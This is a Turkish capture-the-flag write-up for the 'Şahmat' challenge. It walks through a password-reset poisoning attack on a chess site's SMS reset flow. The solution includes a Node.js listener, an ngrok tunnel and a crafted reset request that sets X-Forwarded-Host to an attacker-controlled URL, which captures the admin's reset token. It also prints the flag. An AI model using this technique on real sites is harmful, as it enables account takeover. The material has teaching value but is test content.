# Şahmat

|    |  |
| ------------- |:-------------:|
| Zorluk        | Çerez(100 Puan)|
| Aşama         | Yarı Final    |
| Soru Türü     | Miscellaneous |
| Dosyalar      | sms.apk       |    
| Yazar         | [Rednexie](https://github.com/Rednexie) | 
 

## Soru Açıklaması
```
Zeki ama teknolojik konulardan bihaber bir oyuncu olan şahmat, kurduğu platformdan telefonuna gelen tüm SMS'lerdeki bağlantılara tıklamaktadır.
```


### Sorunun alakalı olduğu alanlar
- Web Güvenliği
- Android 

## İpuçları
```
URL'yi nereden bileyim ki, senden duydum ben. ~sunucu
```

## Bayrak
```
BayrakBende{ş4h_M4t_L1br*r4l}
```


# WriteUp

## Soru Hakkında Bildiklerimiz ve Giriş

Soru ile ilgili bilgilerimiz aşağıdaki gibidir: 
- Soru için bize bir web sitesi, bir de Android Uygulaması(APK olarak) verilmiştir.
- Soruda verilen sitenin sahipleri, siteden gelen her türlü sms'teki bağlantıya tıklamaktadırlar, kendileri göndermiş olmasalar bile. 


## APK'nın incelenmesi ve Sitenin Genel Analizi

Soruda bize bir adet APK ve bir adet web sitesine erişim verilmektedir. 
Siteyi açtığımızda karşımıza popup olarak bir yönlendirici token'ı çıkmaktadır. Bu token gelecekte APK dosyasında karşımıza çıkacağı için şimdilik boşverebiliriz.


Sitenin içeriği ve amacına göz attığımızda, görüldüğü üzere şahmat isimli bir çevrimiçi satranç platformudur. Ayrıca bir sms onaylama sistemiyle anlaşmalı olduğu görülmektedir. Kullanıcılar telefon numaralarıyla buraya kaydolabilmektedirler. Ayrıca şifre sıfırlama gibi olmazsa olmaz platform özellikleri de mevcuttur ve sorunsuz çalışmaktadır.


APK'ya geri döndüğümüzde, APK ise kullanıcıların telefon numaralarını vermek istemedikleri, ancak SMS onaylaması isteyen yerlerde kullanmaları için tasarlanmış bir sistemdir. Şahmat'tan aldığımız token'ı uygulamayı açtığımızda çıkan kısma girdiğimizde, herhangi bir ücret almadan birkaç tane telefon numarası kullanımımıza sunulmaktadır. Bize düşen de bu telefon numaralarını kullanarak Şahmat üyeliğimizi oluşturmak ve hesapla ilgili fonskiyonları inceleyebilmektir.

Kayıt olma kısmına telefon numaramız, kullanıcı admız ve şifremizi girdiğimizde herhangi bir sıradışı durumla karşılaşmamamız gerekmektedir. Uygulamadan seçtiğimz numaranın mesajlarına, kaydımızı tamamladığımızla ilgili bir SMS gelecektir. Diğer kısımları incelediğimizde ise gözümüze çarpan şey şu olmalıdır: Telefon numarasını bilmediğimiz kullanıcıların telefonlarına şifre sıfırlama bağlantısı gönderebilmekteyiz, bunu kontrol etmek için kendi kullanıcı adımızı girerek kendimize bir SMS gönderebiliriz.

Burada aklımıza takılması gereken, gelen sms bağlantısıdaki URL'nin hardcoded olamayacak kadar spesifik olmasıdır. URL https değildir ve bir port içermektedir. Muhtemelen sunucu tarafında bir şekilde isteğin geldiği URL elde edilmekte ve gönderilen SMS'e bağlantı yerleştirilirken bu kullanılmaktadır. Bu da Host Header Manipulation Güvenlik Zafiyetinin olma ihtimalini göstermektedir. Sunucudan gelen yanıt başlıklarına baktığımızda, nginx veya apache gibi herhangi bir reverse proxy'nin varlığına rastlamamaktayız:

```
x-ratelimit-remaining 0
Connection            keep-alive
Keep-Alive            timeout=72
Accept-Ranges         bytes
Content-Length        6872
Cache-Control         public, max-age=0
Content-Type          text/html; charset=utf-8
Date                  Fri, 30 May 2025 20:52:54 GMT
ETag                  W/"1ad8-197225947e0"
Last-Modified         Fri, 30 May 2025 17:59:25 GMT
```


Bu da düşündüğümüz gibi Host Header Manipulation güvenlik açığını doğrulayan bir etkendir. 


## Zafiyetin Sömürülmesi


Sorunun açıklama kısmında bize platformun şu anki yöneticisi olan 'admin' kullanıcısının, herhangi bir kontrol yapmaksızın platformdan telefonuna gelen her türlü SMS'teki bağlantıyı açtığı belirtilmektedir. 
Yani gönderdiğimiz istekteki 'x-forwarded-host' değerini değiştirerek gönderdiğimiz bir şifre sıfırlama isteği, admin'e bizim url'mizi gönderecektir.


Bunun için herkese açık bir sunucuya ihtiyacımız olacak. Kendi hosting veya sunucumuzu kullanabilir, ya da ngrok veya localtunnel gibi reverse proxy'ler aracılığıyla cihazımızı dışarıya açabiliriz. Ben bu örnekte ngrok kullanacağım.
Ayrıca yine istenilen dil kullanılacak şekilde, şifre sıfırlama token'ını alabilmemiz için sunucuya gelen tüm istekleri terminale yazdıran bir web sunucusuna ihtiyacımız olacak. Ben Node.js tercih edeceğim:

```js
const http = require('http');
const url = require('url');

const server = http.createServer((req, res) => {
    console.log(new Date().toISOString());
    const parsedUrl = url.parse(req.url, true);
    console.log(parsedUrl.pathname);
    Object.entries(parsedUrl.query).forEach(([k, v]) => console.log(`${k}=${v}`));
    res.end();
});

server.listen(3000);
```

Sunucumuzu çalıştırdıktan sonra, ngrok ile portumuzu dışarı çıkaralım:

```
ngrok http 3000
```

Bu bize çıktı olarak tüm herkesin erişebileceği bir url verecektir, örneğin:

`https://xxxx-xxxx-xxxx-xxxx-xxxx.ngrok-free.app`

Şimdi, url'mizi gerekli kısma girmek üzere bir şifre sıfırlama isteği gönderelim: 

```
GET /api/reset?identifier=admin&method=username HTTP/1.1
X-Forwarded-Host: https://xxxx-xxxx-xxxx-xxxx-xxxx.ngrok-free.app
Host: soru.bayraksende.com:8383
Accept: */*
Accept-Language: tr,en-US;q=0.9,en;q=0.8
Referer: http://localhost:8383/reset

```

Şifre sıfırlama talimatının başarıyla gönderildiği mesajını almamızın ardından, sunucumuzun çalıştığı terminalde bir çıktı gözükecektir:

```
2025-05-31T14:25:36.789Z
/complete-resetation
token=9d207b8340804c8ebdbb73886958ae13
```

Bu token ile admin şifresini sıfırlayıp, hesaba girebiliriz. Girişin ardından bizi karşılayan profil kısmında, admin kullanıcısının hesap açıklamasında flag görünecektir.

